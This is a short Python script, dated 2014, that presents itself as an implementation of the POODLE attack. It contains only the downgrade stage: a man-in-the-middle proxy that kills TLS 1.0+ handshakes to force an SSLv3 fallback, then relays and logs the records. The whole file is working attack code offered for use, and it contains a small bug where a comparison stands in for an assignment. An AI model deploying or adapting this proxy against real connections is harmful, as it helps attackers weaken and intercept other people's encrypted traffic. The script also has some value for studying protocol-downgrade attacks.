#!/usr/bin/python3
# Implementation of the POODLE attack.
# Copyright 2014 Thomas Skora <thomas@skora.net>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import socket
import socketserver
import struct
import select

### Configuration ###
host = "localhost"
tlsPort = 8443
serverHost = "localhost"
serverPort = 4433
httpPort = 8080
timeout = 30.0
#####################

class TLSRecord:
    tlsContentType = {20: 'change_cipher_spec', 21: 'alert', 22: 'handshake', 23: 'application_data'}

    def __init__(self, rsocket):
        self.raw = rsocket.recv(5)
        if len(self.raw) < 5:
            raise TypeError("Not a SSL/TLS packet")
        self.contentType, self.majorVersion, self.minorVersion, self.length = struct.unpack("!BBBH", self.raw)
        self.textContentType = self.tlsContentType[self.contentType]
        self.content = rsocket.recv(self.length)
        self.raw += self.content


class SSLTLSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print("Received connection from {}".format(self.client_address[0]))
        tlsRecord = TLSRecord(self.request)
        if (tlsRecord.contentType == 0x16 and tlsRecord.majorVersion == 0x03 and tlsRecord.minorVersion > 0x00):       # TLS >= 1.0 handshake -> kill it to degrade!
            print("Protocol minor version {:d} - trying to degrade.".format(tlsRecord.minorVersion))
            return
        
        try:
            self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.forward.connect((serverHost, serverPort))
            self.forward.sendall(tlsRecord.raw)
            while (True):
                readable, writable, errors = select.select((self.request, self.forward), (), (self.request, self.forward), timeout)
                if len(errors) > 0:
                    sockname = "unknown"
                    if errors[0] == self.request:
                            sockname = "client-side"
                    elif errors[0] == self.forward:
                            sockname == "server-side"
                    print(sockname + " socket signalizes an error!")
                    break

                for rsocket in readable:
                    ssocket = None
                    rsockname = "unknown"
                    ssockname = "unknown"
                    if rsocket == self.request:
                        ssocket = self.forward
                        rsockname = "client"
                        ssockname = "server"
                    else:
                        ssocket = self.request
                        ssockname = "client"
                        rsockname = "server"
                    
                    record = TLSRecord(rsocket)
                    print("Forwarding TLS record type {} of length {:d} from {} to {}".format(record.textContentType, len(record.raw), rsockname, ssockname))
                    ssocket.sendall(record.raw)
                                    
        except IOError as e:
            print("I/O error: {} ({})".format(e.strerror, e.errno))
        except TypeError:
            pass
        except StopIteration:
            pass
        finally:
            self.forward.close()
            print("Connection closed!")


class SSLTLSProxy(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

### Main ###
tlsServer = SSLTLSProxy((host, tlsPort), SSLTLSHandler)
tlsServer.serve_forever()
